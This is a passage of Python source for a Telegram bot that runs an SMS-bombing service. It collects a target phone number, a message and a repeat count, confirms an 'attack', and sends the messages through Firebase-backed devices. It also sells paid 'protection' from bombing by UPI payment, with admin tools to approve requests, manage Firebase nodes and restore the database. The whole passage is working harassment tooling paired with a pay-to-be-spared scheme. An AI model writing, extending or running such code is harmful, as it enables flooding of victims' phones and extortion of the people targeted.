        await cq.answer(sc("❌ ғɪʀᴇʙᴀꜱᴇꜱ ᴅᴇᴠɪᴄᴇ ᴀᴅᴅ ᴋᴀʀᴏ! ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."), show_alert=True)
        return

    await state.set_state(Form.bomb_number)
    try:
        await cq.message.edit_text(
            styled_box("ᴛᴀʀɢᴇᴛ ᴀᴄǫᴜɪꜱɪᴛɪᴏɴ", f"📞 {sc('ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ :')}\n\n{sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>\n{sc('ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ᴡɪᴛʜ sᴛᴀʀᴛ')}\n\n<i>{sc('ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]]), parse_mode="HTML")
    except Exception:
        pass

@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴅᴀʟᴏ"))
        return
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! ᴇx: +919876543210"))
        return

    d = load()
    protected = d.get("protected_numbers", [])
    if number in protected:
        await msg.answer(styled_box("🛡️ ᴘʀᴏᴛᴇᴄᴛᴇᴅ",
            f"🚫 {sc('ᴛʜɪꜱ ɴᴜᴍʙᴇʀ ɪꜱ ᴘʀᴏᴛᴇᴄᴛᴇᴅ')}\n\n{sc('ʏᴏᴜ ᴄᴀɴɴᴏᴛ ʙᴏᴍʙ ᴛʜɪꜱ ɴᴜᴍʙᴇʀ.')}\n\n<i>{sc('ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ')}</i>"), parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await msg.answer(sc("💬 ᴍᴇꜱꜱᴀɢᴇ ᴅᴀʟᴏ\n\nᴍᴇꜱꜱᴀɢᴇ ᴛʏᴘᴇ ᴋᴀʀᴏ ᴊᴏ ʙʜᴇᴊɴᴀ ʜᴀɪ\n\n<i>ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML",
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]]))

@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    message = msg.text.strip() if msg.text else ""
    if not message:
        await msg.answer(sc("❌ ᴍᴇꜱꜱᴀɢᴇ ᴋʜᴀʟɪ ɴᴀʜɪ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ!"))
        return
    await state.update_data(message=message)
    await state.set_state(Form.bomb_count)
    await msg.answer(f"{sc('🔁 ᴋɪᴛɴᴇ ᴍᴇꜱꜱᴀɢᴇ ʙʜᴇᴊɴᴇ ʜᴀɪ?')}\n\n{sc('ᴋɪᴛɴᴇ ᴍᴇꜱꜱᴀɢᴇꜱ ʙʜᴇᴊɴᴇ ʜᴀɪ?')}\n{sc('ᴍᴀxɪᴍᴜᴍ')}: {MAX_COUNT}\n\n<i>{sc('ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>", parse_mode="HTML",
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]]))

@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_COUNT:
            await msg.answer(f"{sc('❌ ᴋᴏ 1 ꜱᴇ ʟᴇ ᴋᴀʀ ᴋᴇ ʙʜᴇᴊ ʟɪᴍɪᴛ')}{MAX_COUNT}!")
            return
    except Exception:
        await msg.answer(sc("❌ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴅᴀʟᴏ!"))
        return

    data = await state.get_data()
    number, message, uid = data.get("number"), data.get("message"), msg.from_user.id

    try:
        await msg.answer(
            styled_box("ᴄᴏɴꜰɪʀᴍ ᴀᴛᴛᴀᴄᴋ",
            f"📞 {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n"
            f"💬 {sc('ᴍᴇꜱꜱᴀɢᴇ')}: <code>{message[:30]}{'...' if len(message) > 30 else ''}</code>\n"
            f"🔁 {sc('ᴄᴏᴜɴᴛ')}: <b>{count}</b>\n\n"
            f"<b>{sc('ᴛᴏ ʀᴇᴀᴅʏ?')}</b>"),
            parse_mode="HTML",
            reply_markup=kb([
                [("✅ " + sc("ᴄᴏɴꜰɪʀᴍ ᴀᴛᴛᴀᴄᴋ"), f"bomb:confirm:{number}:{count}", "success")],
                [("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]
            ])
        )
        await state.update_data(bomb_message=message)
    except Exception as e:
        log.error(f"confirm msg error: {e}")

@R.callback_query(F.data.startswith("bomb:confirm:"))
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    number, count = parts[2], int(parts[3])
    data = await state.get_data()
    message = data.get("bomb_message", "Hello!")
    try:
        await state.clear()
    except Exception:
        pass

    await cq.answer(sc("💣 ʟᴀᴜɴᴄʜɪɴɢ..."))
    try:
        await cq.message.edit_text(sc("⏳ ɪɴɪᴛɪᴀᴛɪɴɢ ʙᴏᴍʙɪɴɢ..."), parse_mode="HTML")
    except Exception:
        pass
    await start_bombing(cq.bot, cq.from_user.id, number, message, count)

# ── Protection Flow ─────────────────────────────────────────────
@R.callback_query(F.data == "protect:start")
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    try:
        await cq.message.edit_text(
            styled_box("🛡️ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ",
            f"{sc('ᴀᴘɴᴀ ɴᴜᴍʙᴇʀ ᴋᴏ sᴍꜱ ʙᴏᴍʙᴇʀ ꜱᴇ ᴘʀᴏᴛᴇᴄᴛ ᴋᴀʀᴇ')}\n\n"
            f"💰 {sc('ᴘʀɪᴄᴇ')}: <b>{PROTECTION_PRICE}</b>\n"
            f"📲 {sc('ᴘᴀʏ ᴛᴏ')}: <code>{PAYMENT_UPI}</code>\n\n"
            f"{sc('ᴘᴀʏᴍᴇɴᴛ ᴋᴀʀɴᴇ ᴋᴇ ʙᴀᴀᴅ ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ᴅᴇᴛᴀɪʟꜱ ᴅᴀʟᴇɴɢᴇ. ᴀᴅᴍɪɴ ᴠᴇʀɪꜰʏ ᴋᴀʀɴᴇ ᴋᴇ ʙᴀᴀᴅ ᴀᴀᴘᴋᴀ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛ ʜᴏ ᴊᴀʏᴇɢᴀ.')}"),
            reply_markup=kb([
                [("💸 " + sc("ᴘᴀɪᴅ"), "protect:paid", "success")],
                [("🔙 " + sc("ʙᴀᴄᴋ"), "home", "danger")]
            ]), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data == "protect:paid")
async def cb_protect_paid(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.protect_txn)
    try:
        await cq.message.edit_text(
            styled_box("ᴠᴇʀɪꜰʏ ᴘᴀʏᴍᴇɴᴛ",
            f"{sc('ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ɪᴅ ᴅᴀʟᴏ (ᴜᴛʀ/ʀᴇꜰ ɴᴏ.)')}\n\n"
            f"<i>{sc('ᴇxᴀᴍᴘʟᴇ')}: T123456789012</i>"),
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]]), parse_mode="HTML")
    except Exception:
        pass

@R.message(Form.protect_txn)
async def process_protect_txn(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛᴇxᴛ!"))
        return
    txn = msg.text.strip()
    if len(txn) < 5:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ɪᴅ!"))
        return
    await state.update_data(txn_id=txn)
    await state.set_state(Form.protect_number)
    try:
        await msg.answer(
            styled_box("ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ",
            f"{sc('ᴊɪꜱ ɴᴜᴍʙᴇʀ ᴋᴏ ᴘʀᴏᴛᴇᴄᴛ ᴋᴀʀɴᴀ ʜᴀɪ')}\n\n"
            f"{sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>"),
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home", "danger")]]), parse_mode="HTML")
    except Exception:
        pass

@R.message(Form.protect_number)
async def process_protect_number(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴅᴀʟᴏ!"))
        return

    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! ᴇx: +919876543210"))
        return

    data = await state.get_data()
    txn_id = data.get("txn_id")
    uid = msg.from_user.id
    username = msg.from_user.username or msg.from_user.first_name

    d = load()
    req_id = str(int(time.time()))
    request = {
        "id": req_id, "user_id": uid, "username": username,
        "number": number, "txn_id": txn_id,
        "status": "pending", "time": datetime.now().isoformat()
    }
    d["protection_requests"].append(request)
    save(d)

    try:
        await state.clear()
    except Exception:
        pass

    await msg.answer(styled_box("ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ꜱᴜʙᴍɪᴛᴛᴇᴅ",
        f"✅ {sc('ᴀᴀᴘᴋᴀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ ᴀᴅᴍɪɴ ᴋᴇ ᴘᴀᴀꜱ ʙʜᴇᴊ ᴅɪ ɢᴀʏɪ ʜᴀɪ')}\n\n"
        f"{sc('ᴀᴘᴘʀᴏᴠᴀʟ ᴋᴇ ʙᴀᴀᴅ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ ᴍɪʟᴇɢᴀ')}"), parse_mode="HTML")

    admin_text = styled_box("🛡️ ɴᴇᴡ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ",
        f"👤 {sc('ᴜꜱᴇʀ')}: <code>{uid}</code> (@{username})\n"
        f"📞 {sc('ɴᴜᴍʙᴇʀ')}: <code>{number}</code>\n"
        f"💸 {sc('ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ')}: <code>{txn_id}</code>\n\n"
        f"<i>{sc('ᴀᴘᴘʀᴏᴠᴇ ᴛᴏ ᴘʀᴏᴛᴇᴄᴛ ᴛʜɪꜱ ɴᴜᴍʙᴇʀ.')}</i>")

    kb_rows = [
        [("✅ " + sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{req_id}", "success")],
        [("❌ " + sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{req_id}", "danger")]
    ]

    admins_to_notify = set(d.get("admins", []))
    admins_to_notify.add(OWNER_ID)
    for admin_id in admins_to_notify:
        try:
            await msg.bot.send_message(admin_id, admin_text, reply_markup=kb(kb_rows), parse_mode="HTML")
        except Exception as e:
            log.warning(f"Could not notify admin {admin_id}: {e}")

# ── Admin Panel ─────────────────────────────────────────────────
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ!"), show_alert=True)
        return

    fb_count = len(d.get("firebases", []))
    pending_reqs = len([r for r in d.get("protection_requests", []) if r.get("status") == "pending"])

    text = styled_box("ᴀᴅᴍɪɴ ᴄᴏɴᴛʀᴏʟ ᴄᴇɴᴛᴇʀ",
        f"🔘 {sc('ɴᴏᴅᴇꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"📊 {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{d.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"👥 {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"🚫 {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n"
        f"🛡️ {sc('ᴘᴇɴᴅɪɴɢ ʀᴇǫꜱ')}: <b>{pending_reqs}</b>")
    try:
        await cq.message.edit_text(text, reply_markup=admin_panel_kb(d), parse_mode="HTML")
    except Exception:
        pass

# ── Protection Admin Management ─────────────────────────────────
@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery):
    d = load()
    requests = d.get("protection_requests", [])
    pending = [r for r in requests if r.get("status") == "pending"]

    if not pending:
        await cq.answer(sc("✅ ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇꜱᴛꜱ!"), show_alert=True)
        return

    text = styled_box("🛡️ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛꜱ", "")
    kb_rows = []
    for r in pending:
        text += f"👤 <code>{r['user_id']}</code> | 📞 <code>{r['number']}</code>\n"
        text += f"💸 Txn: <code>{r['txn_id']}</code>\n\n"
        kb_rows.append([
            (sc("✅ ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{r['id']}", "success"),
            (sc("❌ ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{r['id']}", "danger")
        ])
    kb_rows.append([("🔙 " + sc("ʙᴀᴄᴋ"), "admin:panel", "danger")])
    try:
        await cq.message.edit_text(text, reply_markup=kb(kb_rows), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_admin_prot_approve(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()

    req_found = None
    for r in d["protection_requests"]:
        if r["id"] == req_id:
            req_found = r
            break

    if req_found:
        req_found["status"] = "approved"
        if req_found["number"] not in d["protected_numbers"]:
            d["protected_numbers"].append(req_found["number"])
        save(d)

        await cq.answer(sc("✅ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛᴇᴅ!"), show_alert=True)
        try:
            await cq.bot.send_message(req_found["user_id"],
                styled_box("🛡️ ᴀᴘᴘʀᴏᴠᴇᴅ",
                f"✅ {sc('ʏᴏᴜʀ ɴᴜᴍʙᴇʀ')} <code>{req_found['number']}</code> {sc('ɪꜱ ɴᴏᴡ ᴘʀᴏᴛᴇᴄᴛᴇᴅ!')}\n\n"
                f"{sc('ᴀʙ ᴀᴀᴘᴋᴀ ɴᴜᴍʙᴇʀ ᴘᴇ ᴄᴏɪ ʙᴏᴍʙɪɴɢ ɴᴀʜɪ ᴋᴀʀ sᴀᴋᴛᴀ')}"), parse_mode="HTML")
        except Exception:
            pass
        await cb_admin_protection(cq)
    else:
        await cq.answer(sc("❌ ʀᴇǫᴜᴇꜱᴛ ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)

@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_admin_prot_reject(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()

    req_found = None
    for r in d["protection_requests"]:
        if r["id"] == req_id:
            req_found = r
            break

    if req_found:
        req_found["status"] = "rejected"
        save(d)
        await cq.answer(sc("❌ ʀᴇQᴜᴇꜱᴛ ʀᴇᴊᴇᴄᴛᴇᴅ!"), show_alert=True)
        try:
            await cq.bot.send_message(req_found["user_id"],
                styled_box("🛡️ ʀᴇᴊᴇᴄᴛᴇᴅ",
                f"❌ {sc('ʏᴏᴜʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇQᴜᴇꜱᴛ ꜰᴏʀ')} <code>{req_found['number']}</code> {sc('ᴡᴀꜱ ʀᴇᴊᴇᴄᴛᴇᴅ.')}\n\n"
                f"{sc('ᴘʟᴇᴀꜱᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴀʏᴍᴇɴᴛ ᴅᴇᴛᴀɪʟꜱ ᴏʀ ᴛʀʏ ᴀɢᴀɪɴ.')}"), parse_mode="HTML")
        except Exception:
            pass
        await cb_admin_protection(cq)
    else:
        await cq.answer(sc("❌ ʀᴇQᴜᴇꜱᴛ ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)

# ── Database Backup & Restore ───────────────────────────────────
@R.callback_query(F.data == "admin:db_tools")
async def cb_admin_db_tools(cq: types.CallbackQuery):
    try:
        await cq.message.edit_text(
            styled_box("💾 ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴏᴏʟꜱ",
            f"{sc('ᴍᴀɴᴀɢᴇ ʏᴏᴜʀ ʙᴏᴛ ᴅᴀᴛᴀʙᴀꜱᴇ.')}\n\n"
            f"📥 {sc('ʙᴀᴄᴋᴜᴘ')}: {sc('ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ')}\n"
            f"📤 {sc('ʀᴇꜱᴛᴏʀᴇ')}: {sc('ᴜᴘʟᴏᴀᴅ ᴀɴᴅ ʀᴇᴘʟᴀᴄᴇ ᴅᴀᴛᴀ')}\n\n"
            f"<i>{sc('ᴡᴀʀɴɪɴɢ: ʀᴇꜱᴛᴏʀɪɴɢ ᴡɪʟʟ ᴏᴠᴇʀᴡʀɪᴛᴇ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ!')}</i>"),
            reply_markup=kb([
                [("📥 " + sc("ᴅᴏᴡɴʟᴏᴀᴅ ʙᴀᴄᴋᴜᴘ"), "admin:db_backup", "success")],
                [("📤 " + sc("ʀᴇꜱᴛᴏʀᴇ ꜰʀᴏᴍ ꜰɪʟᴇ"), "admin:db_restore_prompt", "primary")],
                [("🔙 " + sc("ʙᴀᴄᴋ"), "admin:panel", "danger")]
            ]), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data == "admin:db_backup")
async def cb_admin_db_backup(cq: types.CallbackQuery):
    if not os.path.exists(DATA_FILE):
        await cq.answer(sc("❌ ᴅᴀᴛᴀʙᴀꜱᴇ ꜰɪʟᴇ ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)
        return
    await cq.answer(sc("📥 ᴘʀᴇᴘᴀʀɪɴɢ ʙᴀᴄᴋᴜᴘ..."))
    try:
        file = FSInputFile(DATA_FILE)
        await cq.bot.send_document(cq.from_user.id, document=file,
            caption=sc("💾 ʜᴇʀᴇ ɪꜱ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀꜱᴇ ʙᴀᴄᴋᴜᴘ."))
    except Exception as e:
        await cq.answer(sc(f"❌ ᴇʀʀᴏʀ: {str(e)}"), show_alert=True)

@R.callback_query(F.data == "admin:db_restore_prompt")
async def cb_admin_db_restore_prompt(cq: types.CallbackQuery):
    try:
        await cq.message.edit_text(
            styled_box("📤 ʀᴇꜱᴛᴏʀᴇ ᴅᴀᴛᴀʙᴀꜱᴇ",
            f"{sc('ꜱᴇɴᴅ ᴛʜᴇ ᴊꜱᴏɴ ʙᴀᴄᴋᴜᴘ ꜰɪʟᴇ ɴᴏᴡ.')}\n\n"
            f"<i>{sc('ᴡᴀʀɴɪɴɢ: ᴛʜɪꜱ ᴡɪʟʟ ᴏᴠᴇʀᴡʀɪᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ!')}</i>"),
            reply_markup=kb([[("🔙 " + sc("ʙᴀᴄᴋ"), "admin:db_tools", "danger")]]), parse_mode="HTML")
    except Exception:
        pass

@R.message(F.document)
async def handle_db_restore(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    if msg.document.file_name and msg.document.file_name.endswith('.json'):
        file_path = f"restore_{msg.document.file_unique_id}.json"
        try:
            await msg.bot.download(msg.document.file_id, destination=file_path)
            with open(file_path, 'r') as f:
                new_data = json.load(f)
            if "admins" in new_data and "firebases" in new_data:
                save(new_data)
                try: os.remove(file_path)
                except Exception: pass
                await msg.answer(styled_box("✅ ʀᴇꜱᴛᴏʀᴇ ᴄᴏᴍᴘʟᴇᴛᴇ",
                    f"{sc('ᴅᴀᴛᴀʙᴀꜱᴇ ʜᴀꜱ ʙᴇᴇɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇꜱᴛᴏʀᴇᴅ!')}"), parse_mode="HTML")
            else:
                try: os.remove(file_path)
                except Exception: pass
                await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴅᴀᴛᴀʙᴀꜱᴇ ꜰᴏʀᴍᴀᴛ!"))
        except Exception as e:
            if os.path.exists(file_path):
                try: os.remove(file_path)
                except Exception: pass
            await msg.answer(sc(f"❌ ᴇʀʀᴏʀ ʀᴇꜱᴛᴏʀɪɴɢ: {str(e)}"))

# ── Add Firebase (with auto-delete if no online devices) ────────
@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ!"), show_alert=True)
        return
    await state.set_state(Form.fb_add_url)
    try:
        await cq.message.edit_text(
            styled_box("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇ",
            f"{sc('ꜱᴇɴᴅ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴀᴛᴀʙᴀꜱᴇ ᴜʀʟ')}\n\n<code>https://your-project.firebaseio.com</code>\n\n<i>{sc('ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel", "danger")]]), parse_mode="HTML")
    except Exception:
        pass

@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = msg.text.strip() if msg.text else ""
    if not url.startswith("https://"):
        await msg.answer(sc("❌ ᴜʀʟ ᴍᴜꜱᴛ ꜱᴛᴀʀᴛ ᴡɪᴛʜ https://"))
        return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(sc("🔑 ᴇɴᴛᴇʀ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴘɪ ᴋᴇʏ\n\n<i>ᴛʏᴘᴇ 'skip' ᴛᴏ ꜱᴋɪᴘ</i>\n\n<i>ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML",
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel", "danger")]]))

@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = msg.text.strip() if msg.text else ""
    if api_key.lower() == "skip": api_key = ""
    data = await state.get_data()
    d = load()

    new_fb = {"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api_key}
    d["firebases"].append(new_fb)
    save(d)
    try:
        await state.clear()
    except Exception:
        pass

    # Verify online devices — auto-delete if none
    status_msg = await msg.answer(sc("🔍 ᴄʜᴇᴄᴋɪɴɢ ꜰᴏʀ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ..."), parse_mode="HTML")
    await animate_radar(status_msg, sc("ꜱᴄᴀɴɴɪɴɢ ɴᴏᴅᴇ..."), 2)

    try:
        devices = await discover_online_devices(new_fb)
    except Exception as e:
        log.error(f"device check failed: {e}")
        devices = []

    if not devices:
        # Auto-delete firebase with no online devices
        d = load()
        d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != new_fb["id"]]
        save(d)
        try:
            await msg.answer(
                styled_box("❌ ɴᴏᴅᴇ ʀᴇᴊᴇᴄᴛᴇᴅ",
                f"{sc('ɴᴏ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ ꜰᴏᴜɴᴅ ᴏɴ ᴛʜɪꜱ ꜰɪʀᴇʙᴀꜱᴇ.')}\n\n"
                f"{sc('ꜰɪʀᴇʙᴀꜱᴇ ᴡᴀꜱ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ʀᴇᴍᴏᴠᴇᴅ!')}"),
                reply_markup=admin_panel_kb(d), parse_mode="HTML")
        except Exception:
            pass
    else:
        try:
            await msg.answer(
                styled_box("✅ ɴᴏᴅᴇ ᴀᴅᴅᴇᴅ",
                f"📱 {sc('ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(devices)}</b>"),
                reply_markup=admin_panel_kb(d), parse_mode="HTML")
        except Exception:
            pass

# ── List Firebases ──────────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("❌ ɴᴏ ɴᴏᴅᴇꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ!"), show_alert=True)
        return
    text = styled_box("ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ",
        "\n".join([f"🔘 {sc('ɴᴏᴅᴇ')} #{i+1} 🔑 {'✅' if fb.get('api_key') else '❌'}"
                   for i, fb in enumerate(fbs)]))
    rows = [[(f"🗑 {sc('ᴅᴇʟᴇᴛᴇ')} #{i+1}", f"admin:fb_del:{fb['id']}", "danger")
             for i, fb in enumerate(fbs)]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel", "primary")])
    try:
        await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("🗑 ɴᴏᴅᴇ ᴅᴇʟᴇᴛᴇᴅ!"), show_alert=True)
    await cb_fb_list(cq)

# ── Admins ──────────────────────────────────────────────────────
@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    text = styled_box("ᴀᴅᴍɪɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ",
        "\n".join([f"👑 <code>{aid}</code> (Owner)" if aid == OWNER_ID else f"👤 <code>{aid}</code>"
                   for aid in admins]))
    rows = [[(f"🗑 {sc('ʀᴇᴍᴏᴠᴇ')} {aid}", f"admin:admin_del:{aid}", "danger")
             for aid in admins if aid != OWNER_ID]]
    rows.append([("➕ " + sc("ᴀᴅᴅ ᴀᴅᴍɪɴ"), "admin:admin_add", "success")])
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel", "primary")])
    try:
        await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.bomb_number)
    try:
        await cq.message.edit_text(sc("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ\n\nꜱᴇɴᴅ ᴛʜᴇ ᴛᴇʟᴇɢʀᴀᴍ ᴜꜱᴇʀ ɪᴅ:\n\n<i>ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML",
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel", "danger")]]))
    except Exception:
        pass

@R.message(Form.bomb_number)
async def process_admin_add(msg: types.Message, state: FSMContext):
    try:
        admin_id = int(msg.text.strip())
        d = load()
        if admin_id not in d.get("admins", []):
            d["admins"].append(admin_id)
            save(d)
            try:
                await state.clear()
            except Exception:
                pass
            await msg.answer(f"{sc('✅ ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ!')}\n\n👤 <code>{admin_id}</code>",
                parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
            await msg.answer(sc("❌ ᴛʜɪꜱ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ!"))
    except Exception:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    try:
        admin_id = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ɪᴅ"), show_alert=True)
        return
    if admin_id == OWNER_ID:
        await cq.answer(sc("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ!"), show_alert=True)
        return
    d = load()
    if admin_id in d.get("admins", []):
        d["admins"].remove(admin_id)
        save(d)
